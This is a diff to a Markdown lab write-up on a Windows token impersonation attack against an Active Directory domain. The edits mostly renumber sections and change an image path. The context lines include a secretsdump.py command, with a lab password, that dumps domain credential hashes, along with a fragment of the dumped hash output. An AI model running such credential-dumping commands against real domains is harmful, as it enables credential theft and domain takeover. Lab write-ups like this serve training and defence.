@@ -25,25 +25,9 @@
 - [Step 6 - Verify Access](#step-6---verify-access)
   - [6.1 Create Domain User](#step-61---create-a-domain-user)
   - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
-- [Dump All Hashes](#dump-all-hashes)
+- [Step 7 - Dump All Hashes](#step-7--dump-all-hashes)
 - [Key Takeaways](#key-takeaways)
 - [Mitigation](#mitigation)
-
-<!-- - [Introduction](#introduction)
-- [Lab Setup](#lab-setup)
-- [Attack Flow](#attack-flow)
-- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
-- [Step 2 - Check UID](#step-2---check-uid)
-- [Step 3 - Load Incognito](#step-3---load-incognito)
-- [Step 4 - List Available Tokens](#step-4---list-available-tokens)
-- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
-- [Step 6 - Verify Access](#step-6---verify-access)
-- [Why It Worked](#why-it-worked)
-- [Detection](#detection)
-- [Mitigation](#mitigation)
-- [Key Takeaways](#key-takeaways)
-- [References](#references)
-- [Disclaimer](#disclaimer) -->
 
 ## Introduction
 
@@ -531,7 +515,7 @@ The request will be processed at a domain controller for domain READTEAMBD.local
 The command completed successfully.
 ```
 
-### Dump all hashes:
+## Step 7 - Dump All Hashes
 
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
@@ -620,7 +604,7 @@ VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
 ```
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step6.png" width="600">
+  <img src="/writeups/token impersonation attack/images/step7.png" width="600">
 </p>
 
 
